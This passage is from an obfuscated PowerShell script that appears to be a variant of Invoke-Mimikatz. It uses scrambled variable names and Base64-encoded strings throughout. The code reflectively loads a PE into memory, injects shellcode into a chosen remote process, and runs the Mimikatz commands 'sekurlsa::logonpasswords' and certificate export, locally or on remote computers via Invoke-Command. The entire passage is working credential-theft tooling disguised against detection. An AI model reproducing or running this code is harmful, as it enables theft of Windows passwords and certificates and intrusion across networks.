					${_/\_/\_/\/\__/=\/} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					${/==\___/=\_/\_/\/} = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				${__/=\_/===\___/=\} = ${__/\_/\/===\/\/\/}.Length + ${_/\_/\_/\/\__/=\/}.Length + ${/==\___/=\_/\_/\/}.Length + (${____/\__/\_/==\/=} * 2)
				${/==\_____/=\___/=} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${__/=\_/===\___/=\})
				${__/==\/==\/\/====} = ${/==\_____/=\___/=}
				___/===\_/\/=\__/\ -_/====\____/\___/\ ${__/\_/\/===\/\/\/} -____/\/====\__/==\ ${/==\_____/=\___/=}
				${/==\_____/=\___/=} = __/\______/=\___/\ ${/==\_____/=\___/=} (${__/\_/\/===\/\/\/}.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${____/=\_/==\/=\_/}, ${/==\_____/=\___/=}, $false)
				${/==\_____/=\___/=} = __/\______/=\___/\ ${/==\_____/=\___/=} (${____/\__/\_/==\/=})
				___/===\_/\/=\__/\ -_/====\____/\___/\ ${_/\_/\_/\/\__/=\/} -____/\/====\__/==\ ${/==\_____/=\___/=}
				${/==\_____/=\___/=} = __/\______/=\___/\ ${/==\_____/=\___/=} (${_/\_/\_/\/\__/=\/}.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/\/\/\__/\__/===}, ${/==\_____/=\___/=}, $false)
				${/==\_____/=\___/=} = __/\______/=\___/\ ${/==\_____/=\___/=} (${____/\__/\_/==\/=})
				___/===\_/\/=\__/\ -_/====\____/\___/\ ${/==\___/=\_/\_/\/} -____/\/====\__/==\ ${/==\_____/=\___/=}
				${/==\_____/=\___/=} = __/\______/=\___/\ ${/==\_____/=\___/=} (${/==\___/=\_/\_/\/}.Length)
				${__/==\/\/\/\/=\_/} = $Win32Func.VirtualAllocEx.Invoke(${__/\_/\__/=\/=\_/\}, [IntPtr]::Zero, [UIntPtr][UInt64]${__/=\_/===\___/=\}, $Win32Const.MEM_COMMIT -bor $Win32Const.MEM_RESERVE, $Win32Const.PAGE_EXECUTE_READWRITE)
				if (${__/==\/\/\/\/=\_/} -eq [IntPtr]::Zero)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
				}
				${__/=====\__/\__/\} = $Win32Func.WriteProcessMemory.Invoke(${__/\_/\__/=\/=\_/\}, ${__/==\/\/\/\/=\_/}, ${__/==\/==\/\/====}, [UIntPtr][UInt64]${__/=\_/===\___/=\}, [Ref]${_/=\/===\_/==\__/})
				if ((${__/=====\__/\__/\} -eq $false) -or ([UInt64]${_/=\/===\_/==\__/} -ne [UInt64]${__/=\_/===\___/=\}))
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
				}
				${_/====\/\_/\_/===} = ____/\_/\_/\__/\__ -__/==\_/\__/\_/=\_ ${__/\_/\__/=\/=\_/\} -__/\/==\_/\_/\_/=\ ${__/==\/\/\/\/=\_/} -Win32Func $Win32Func
				${__/=\/==\____/\/\} = $Win32Func.WaitForSingleObject.Invoke(${_/====\/\_/\_/===}, 20000)
				if (${__/=\/==\____/\/\} -ne 0)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgAgAGYAYQBpAGwAZQBkAC4A')))
				}
				$Win32Func.VirtualFreeEx.Invoke(${__/\_/\__/=\/=\_/\}, ${__/==\/\/\/\/=\_/}, [UIntPtr][UInt64]0, $Win32Const.MEM_RELEASE) | Out-Null
			}
		}
		elseif (${__/\___/===\/\/=\/}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUA'))))
		{
			[IntPtr]${__/\/==\_/\__/\/==} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte(${__/\/==\_/\__/\/==}, 0, 0x00)
			${_/==\_/\__/\__/=\} = _/==\_/\/==\_/=\__ -PEInfo ${__/\___/===\/\/=\/} -Win32Func $Win32Func -Win32Constants $Win32Const -__/\/\__/\__/===\_ ${____/====\/====\_/} -__/\/==\_/\__/\/== ${__/\/==\_/\__/\/==}
			[IntPtr]${/=\__/\_/=\/==\__} = __/\______/=\___/\ (${__/\___/===\/\/=\/}.PEHandle) (${__/\___/===\/\/=\/}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAEUAWABFACAATQBhAGkAbgAgAGYAdQBuAGMAdABpAG8AbgAuACAAQQBkAGQAcgBlAHMAcwA6ACAAJAB7AF8AXwBfAF8ALwA9AD0AXAAvAD0APQBcAC8APQA9AD0AXAB9AC4AIABDAHIAZQBhAHQAaQBuAGcAIAB0AGgAcgBlAGEAZAAgAGYAbwByACAAdABoAGUAIABFAFgARQAgAHQAbwAgAHIAdQBuACAAaQBuAC4A')))
			$Win32Func.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, ${/=\__/\_/=\/==\__}, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
			while($true)
			{
				[Byte]${_/=\__/======\/\/} = [System.Runtime.InteropServices.Marshal]::ReadByte(${__/\/==\_/\__/\/==}, 0)
				if (${_/=\__/======\/\/} -eq 1)
				{
					_____/\_/\/\_/\_/\ -_____/==========\_ ${_/==\_/\__/\__/=\} -Win32Func $Win32Func -Win32Constants $Win32Const
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAIAB0AGgAcgBlAGEAZAAgAGgAYQBzACAAYwBvAG0AcABsAGUAdABlAGQALgA=')))
					break
				}
				else
				{
					sleep -Seconds 1
				}
			}
		}
		return @(${__/\___/===\/\/=\/}.PEHandle, ${____/=\_/==\/=\_/})
	}
	Function __/=\_/=\__/=\__/\
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${_/====\___/\__/=\/}
		)
		$Win32Const = Get-Win32Constants
		$Win32Func = ___/\/\_/\/======\
		$Win32Types = _/=\/\/=\_/=\_/\__
		${__/\___/===\/\/=\/} = _/==\/\_/\/\_/\_/= -_/====\___/\__/=\/ ${_/====\___/\__/=\/} -Win32Types $Win32Types -Win32Constants $Win32Const
		if (${__/\___/===\/\/=\/}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]${__/\_/\/\/\_/====} = __/\______/=\___/\ ([Int64]${__/\___/===\/\/=\/}.PEHandle) ([Int64]${__/\___/===\/\/=\/}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			while ($true)
			{
				${__/\/\/\_/\/\__/=} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${__/\_/\/\/\_/====}, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				if (${__/\/\/\_/\/\__/=}.Characteristics -eq 0 `
						-and ${__/\/\/\_/\/\__/=}.FirstThunk -eq 0 `
						-and ${__/\/\/\_/\/\__/=}.ForwarderChain -eq 0 `
						-and ${__/\/\/\_/\/\__/=}.Name -eq 0 `
						-and ${__/\/\/\_/\/\__/=}.TimeDateStamp -eq 0)
				{
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAgAHUAbgBsAG8AYQBkAGkAbgBnACAAdABoAGUAIABsAGkAYgByAGEAcgBpAGUAcwAgAG4AZQBlAGQAZQBkACAAYgB5ACAAdABoAGUAIABQAEUA')))
					break
				}
				${/=\_____/\_/\/\/=} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((__/\______/=\___/\ ([Int64]${__/\___/===\/\/=\/}.PEHandle) ([Int64]${__/\/\/\_/\/\__/=}.Name)))
				${_____/==\/\______} = $Win32Func.GetModuleHandle.Invoke(${/=\_____/\_/\/\/=})
				if (${_____/==\/\______} -eq $null)
				{
					Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAZwBlAHQAdABpAG4AZwAgAEQATABMACAAaABhAG4AZABsAGUAIABpAG4AIABNAGUAbQBvAHIAeQBGAHIAZQBlAEwAaQBiAHIAYQByAHkALAAgAEQATABMAE4AYQBtAGUAOgAgACQAewAvAD0APQBcAF8AXwBfAC8AXABfAF8ALwBcAC8AXAAvAFwAfQAuACAAQwBvAG4AdABpAG4AdQBpAG4AZwAgAGEAbgB5AHcAYQB5AHMA'))) -WarningAction Continue
				}
				${__/=====\__/\__/\} = $Win32Func.FreeLibrary.Invoke(${_____/==\/\______})
				if (${__/=====\__/\__/\} -eq $false)
				{
					Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABmAHIAZQBlACAAbABpAGIAcgBhAHIAeQA6ACAAJAB7AC8APQA9AFwAXwBfAF8ALwBcAF8AXwAvAFwALwBcAC8AXAB9AC4AIABDAG8AbgB0AGkAbgB1AGkAbgBnACAAYQBuAHkAdwBhAHkAcwAuAA=='))) -WarningAction Continue
				}
				${__/\_/\/\/\_/====} = __/\______/=\___/\ (${__/\_/\/\/\_/====}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGQAbABsAG0AYQBpAG4AIABzAG8AIAB0AGgAZQAgAEQATABMACAAawBuAG8AdwBzACAAaQB0ACAAaQBzACAAYgBlAGkAbgBnACAAdQBuAGwAbwBhAGQAZQBkAA==')))
		${_/\/\/\__/\__/===} = __/\______/=\___/\ (${__/\___/===\/\/=\/}.PEHandle) (${__/\___/===\/\/=\/}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		${/=\__/=\/====\___} = __/\/==\__/=\/===\ @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		${/====\/\/\/==\__/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\/\/\__/\__/===}, ${/=\__/=\/====\___})
		${/====\/\/\/==\__/}.Invoke(${__/\___/===\/\/=\/}.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		${__/=====\__/\__/\} = $Win32Func.VirtualFree.Invoke(${_/====\___/\__/=\/}, [UInt64]0, $Win32Const.MEM_RELEASE)
		if (${__/=====\__/\__/\} -eq $false)
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAAVgBpAHIAdAB1AGEAbABGAHIAZQBlACAAbwBuACAAdABoAGUAIABQAEUAJwBzACAAbQBlAG0AbwByAHkALgAgAEMAbwBuAHQAaQBuAHUAaQBuAGcAIABhAG4AeQB3AGEAeQBzAC4A'))) -WarningAction Continue
		}
	}
	Function __/\_/=\/\_/\/==\/
	{
		$Win32Func = ___/\/\_/\/======\
		$Win32Types = _/=\/\/=\_/=\_/\__
		$Win32Const =  Get-Win32Constants
		${__/\_/\__/=\/=\_/\} = [IntPtr]::Zero
		if ((${_/=\/\_/\/\/\/\/=} -ne $null) -and (${_/=\/\_/\/\/\/\/=} -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AJwB0ACAAcwB1AHAAcABsAHkAIABhACAAUAByAG8AYwBJAGQAIABhAG4AZAAgAFAAcgBvAGMATgBhAG0AZQAsACAAYwBoAG8AbwBzAGUAIABvAG4AZQAgAG8AcgAgAHQAaABlACAAbwB0AGgAZQByAA==')))
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			${_/\/==\/=\/=\__/\} = @(ps -Name $ProcName -ErrorAction SilentlyContinue)
			if (${_/\/==\/=\/=\__/\}.Count -eq 0)
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AJwB0ACAAZgBpAG4AZAAgAHAAcgBvAGMAZQBzAHMAIAAkAFAAcgBvAGMATgBhAG0AZQA=')))
			}
			elseif (${_/\/==\/=\/=\__/\}.Count -gt 1)
			{
				${_/\__/\/==\/\_/\/} = ps | where { $_.Name -eq $ProcName } | select ProcessName, Id, SessionId
				echo ${_/\__/\/==\/\_/\/}
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAHIAZQAgAHQAaABhAG4AIABvAG4AZQAgAGkAbgBzAHQAYQBuAGMAZQAgAG8AZgAgACQAUAByAG8AYwBOAGEAbQBlACAAZgBvAHUAbgBkACwAIABwAGwAZQBhAHMAZQAgAHMAcABlAGMAaQBmAHkAIAB0AGgAZQAgAHAAcgBvAGMAZQBzAHMAIABJAEQAIAB0AG8AIABpAG4AagBlAGMAdAAgAGkAbgAgAHQAbwAuAA==')))
			}
			else
			{
				${_/=\/\_/\/\/\/\/=} = ${_/\/==\/=\/=\__/\}[0].ID
			}
		}
		if ((${_/=\/\_/\/\/\/\/=} -ne $null) -and (${_/=\/\_/\/\/\/\/=} -ne 0))
		{
			${__/\_/\__/=\/=\_/\} = $Win32Func.OpenProcess.Invoke(0x001F0FFF, $false, ${_/=\/\_/\/\/\/\/=})
			if (${__/\_/\__/=\/=\_/\} -eq [IntPtr]::Zero)
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAbwBiAHQAYQBpAG4AIAB0AGgAZQAgAGgAYQBuAGQAbABlACAAZgBvAHIAIABwAHIAbwBjAGUAcwBzACAASQBEADoAIAAkAFAAcgBvAGMASQBkAA==')))
			}
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBvAHQAIAB0AGgAZQAgAGgAYQBuAGQAbABlACAAZgBvAHIAIAB0AGgAZQAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAHQAbwAgAGkAbgBqAGUAYwB0ACAAaQBuACAAdABvAA==')))
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAEkAbgB2AG8AawBlAC0ATQBlAG0AbwByAHkATABvAGEAZABMAGkAYgByAGEAcgB5AA==')))
        try
        {
            ${__/\/=\_/\___/=\/} = gwmi -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }
        if (${__/\/=\_/\___/=\/} -is [array])
        {
            ${_/=\___/\__/=\/\_} = ${__/\/=\_/\___/=\/}[0]
        } else {
            ${_/=\___/\__/=\/\_} = ${__/\/=\_/\___/=\/}
        }
        if ( ( ${_/=\___/\__/=\/\_}.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUAOgAgAA=='))) + ${_/=\___/\__/=\/\_}.AddressWidth + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABQAHIAbwBjAGUAcwBzADoAIAA='))) + ([System.IntPtr]::Size * 8))
            Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAGEAcgBjAGgAaQB0AGUAYwB0AHUAcgBlACAAKAAzADIAYgBpAHQALwA2ADQAYgBpAHQAKQAgAGQAbwBlAHMAbgAnAHQAIABtAGEAdABjAGgAIABPAFMAIABhAHIAYwBoAGkAdABlAGMAdAB1AHIAZQAuACAANgA0AGIAaQB0ACAAUABTACAAbQB1AHMAdAAgAGIAZQAgAHUAcwBlAGQAIABvAG4AIABhACAANgA0AGIAaQB0ACAATwBTAC4A'))) -ErrorAction Stop
        }
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]${_____/=\___/=\/\/=} = [Byte[]][Convert]::FromBase64String($PEBytes64)
        }
        else
        {
            [Byte[]]${_____/=\___/=\/\/=} = [Byte[]][Convert]::FromBase64String($PEBytes32)
        }
        ${_____/=\___/=\/\/=}[0] = 0
        ${_____/=\___/=\/\/=}[1] = 0
		${_/====\___/\__/=\/} = [IntPtr]::Zero
		if (${__/\_/\__/=\/=\_/\} -eq [IntPtr]::Zero)
		{
			${_/\/====\/\_/\_/\} = _____/=\__/=\/=\/= -_____/=\___/=\/\/= ${_____/=\___/=\/\/=} -____/====\/====\_/ ${____/====\/====\_/}
		}
		else
		{
			${_/\/====\/\_/\_/\} = _____/=\__/=\/=\/= -_____/=\___/=\/\/= ${_____/=\___/=\/\/=} -____/====\/====\_/ ${____/====\/====\_/} -__/\_/\__/=\/=\_/\ ${__/\_/\__/=\/=\_/\}
		}
		if (${_/\/====\/\_/\_/\} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABsAG8AYQBkACAAUABFACwAIABoAGEAbgBkAGwAZQAgAHIAZQB0AHUAcgBuAGUAZAAgAGkAcwAgAE4AVQBMAEwA')))
		}
		${_/====\___/\__/=\/} = ${_/\/====\/\_/\_/\}[0]
		${/=\/\__/\/=======} = ${_/\/====\/\_/\_/\}[1] 
		${__/\___/===\/\/=\/} = _/==\/\_/\/\_/\_/= -_/====\___/\__/=\/ ${_/====\___/\__/=\/} -Win32Types $Win32Types -Win32Constants $Win32Const
		if ((${__/\___/===\/\/=\/}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))) -and (${__/\_/\__/=\/=\_/\} -eq [IntPtr]::Zero))
		{
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGYAdQBuAGMAdABpAG8AbgAgAHcAaQB0AGgAIABXAFMAdAByAGkAbgBnACAAcgBlAHQAdQByAG4AIAB0AHkAcABlAA==')))
				    [IntPtr]${_/=\_/\/\__/==\/\} = __/==\/=\/=\/\__/= -_/====\___/\__/=\/ ${_/====\___/\__/=\/} -_____/=\/=\/\___/= $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABvAHcAZQByAHMAaABlAGwAbABfAHIAZQBmAGwAZQBjAHQAaQB2AGUAXwBtAGkAbQBpAGsAYQB0AHoA')))
				    if (${_/=\_/\/\__/==\/\} -eq [IntPtr]::Zero)
				    {
					    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAZgBpAG4AZAAgAGYAdQBuAGMAdABpAG8AbgAgAGEAZABkAHIAZQBzAHMALgA=')))
				    }
				    ${_/=\/=\/\/\_/====} = __/\/==\__/=\/===\ @([IntPtr]) ([IntPtr])
				    ${/=\/\_/\/=\___/=\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/=\_/\/\__/==\/\}, ${_/=\/=\/\/\_/====})
                    ${__/\__/\__/=\__/\} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${____/====\/====\_/})
				    [IntPtr]${/=\__/\___/=\__/\} = ${/=\/\_/\/=\___/=\}.Invoke(${__/\__/\__/=\__/\})
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${__/\__/\__/=\__/\})
				    if (${/=\__/\___/=\__/\} -eq [IntPtr]::Zero)
				    {
				    	Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABnAGUAdAAgAG8AdQB0AHAAdQB0ACwAIABPAHUAdABwAHUAdAAgAFAAdAByACAAaQBzACAATgBVAEwATAA=')))
				    }
				    else
				    {
				        ${_/\/=\_/==\/=\___} = [System.Runtime.InteropServices.Marshal]::PtrToStringUni(${/=\__/\___/=\__/\})
				        echo ${_/\/=\_/==\/=\___}
				        $Win32Func.LocalFree.Invoke(${/=\__/\___/=\__/\});
				    }
		}
		elseif ((${__/\___/===\/\/=\/}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))) -and (${__/\_/\__/=\/=\_/\} -ne [IntPtr]::Zero))
		{
			${____/\___/\/\_/=\} = __/==\/=\/=\/\__/= -_/====\___/\__/=\/ ${_/====\___/\__/=\/} -_____/=\/=\/\___/= $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjAA==')))
			if ((${____/\___/\/\_/=\} -eq $null) -or (${____/\___/\/\_/=\} -eq [IntPtr]::Zero))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjACAAYwBvAHUAbABkAG4AJwB0ACAAYgBlACAAZgBvAHUAbgBkACAAaQBuACAAdABoAGUAIABEAEwATAA=')))
			}
			${____/\___/\/\_/=\} = _____/\___/\__/\_/ ${____/\___/\/\_/=\} ${_/====\___/\__/=\/}
			${____/\___/\/\_/=\} = __/\______/=\___/\ ${____/\___/\/\_/=\} ${/=\/\__/\/=======}
			${_/====\/\_/\_/===} = ____/\_/\_/\__/\__ -__/==\_/\__/\_/=\_ ${__/\_/\__/=\/=\_/\} -__/\/==\_/\_/\_/=\ ${____/\___/\/\_/=\} -Win32Func $Win32Func
		}
		if (${__/\_/\__/=\/=\_/\} -eq [IntPtr]::Zero)
		{
			__/=\_/=\__/=\__/\ -_/====\___/\__/=\/ ${_/====\___/\__/=\/}
		}
		else
		{
			${__/=====\__/\__/\} = $Win32Func.VirtualFree.Invoke(${_/====\___/\__/=\/}, [UInt64]0, $Win32Const.MEM_RELEASE)
			if (${__/=====\__/\__/\} -eq $false)
			{
				Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAAVgBpAHIAdAB1AGEAbABGAHIAZQBlACAAbwBuACAAdABoAGUAIABQAEUAJwBzACAAbQBlAG0AbwByAHkALgAgAEMAbwBuAHQAaQBuAHUAaQBuAGcAIABhAG4AeQB3AGEAeQBzAC4A'))) -WarningAction Continue
			}
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAhAA==')))
	}
	__/\_/=\/\_/\/==\/
}
Function __/\_/=\/\_/\/==\/
{
	if (($PSCmdlet.MyInvocation.BoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))].IsPresent)
	{
		$DebugPreference  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
	}
	Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAFAAcgBvAGMAZQBzAHMASQBEADoAIAAkAFAASQBEAA==')))
	if ($PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB1AG0AcABDAHIAZQBkAHMA'))))
	{
		${____/====\/====\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAGsAdQByAGwAcwBhADoAOgBsAG8AZwBvAG4AcABhAHMAcwB3AG8AcgBkAHMAIABlAHgAaQB0AA==')))
	}
    elseif ($PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB1AG0AcABDAGUAcgB0AHMA'))))
    {
        ${____/====\/====\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAHkAcAB0AG8AOgA6AGMAbgBnACAAYwByAHkAcAB0AG8AOgA6AGMAYQBwAGkAIAAiAGMAcgB5AHAAdABvADoAOgBjAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAgAC8AZQB4AHAAbwByAHQAIgAgACIAYwByAHkAcAB0AG8AOgA6AGMAZQByAHQAaQBmAGkAYwBhAHQAZQBzACAALwBlAHgAcABvAHIAdAAgAC8AcwB5AHMAdABlAG0AcwB0AG8AcgBlADoAQwBFAFIAVABfAFMAWQBTAFQARQBNAF8AUwBUAE8AUgBFAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQAiACAAZQB4AGkAdAA=')))
    }
    else
    {
        ${____/====\/====\_/} = $Command
    }
    [System.IO.Directory]::SetCurrentDirectory($pwd)
	if ($ComputerName -eq $null -or $ComputerName -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBcAHMAKgAkAA=='))))
	{
		icm -ScriptBlock ${_/\_/\/=\_/=\_/\_} -ArgumentList @($PEBytes64, $PEBytes32, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZAA='))), 0, "", ${____/====\/====\_/})
	}
	else
	{
		icm -ScriptBlock ${_/\_/\/=\_/=\_/\_} -ArgumentList @($PEBytes64, $PEBytes32, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZAA='))), 0, "", ${____/====\/====\_/}) -ComputerName $ComputerName
	}
}
__/\_/=\/\_/\/==\/
}
